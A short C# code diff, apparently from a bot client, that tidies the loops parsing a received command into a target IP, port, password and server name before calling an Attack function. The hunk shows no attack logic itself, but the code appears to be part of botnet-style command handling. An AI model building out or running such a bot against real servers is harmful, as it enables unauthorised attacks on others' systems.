@@ -39,24 +39,14 @@ namespace BotClients
 					byte[] port_to_attack = new byte[2];
 					byte[] pass_to_attack = new byte[6];
 					byte[] name_of_server = new byte[32];
-					int j = 0;
-					for (int i = 0; i < 4; i++)
+                    for (int i = 0, j = 0; i < 4; i++)
 						ip_to_attack[j++] = receivedData[i];
-					j = 0;
-					for (int i = 4; i < 6; i++)
-					{
-						port_to_attack[j++] = receivedData[i];
-					}
-					j = 0;
-					for (int i = 6; i < 12; i++)
-					{
-						pass_to_attack[j++] = receivedData[i];
-					}
-					j = 0;
-					for (int i = 12; i < 44; i++)
-					{
-						name_of_server[j++] = receivedData[i];
-					}
+					for (int i = 4, j = 0; i < 6; i++)
+                        port_to_attack[j++] = receivedData[i];
+					for (int i = 6, j = 0; i < 12; i++)
+                        pass_to_attack[j++] = receivedData[i];
+					for (int i = 12, j = 0; i < 44; i++)
+                        name_of_server[j++] = receivedData[i];
 					Attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
 
 					//}
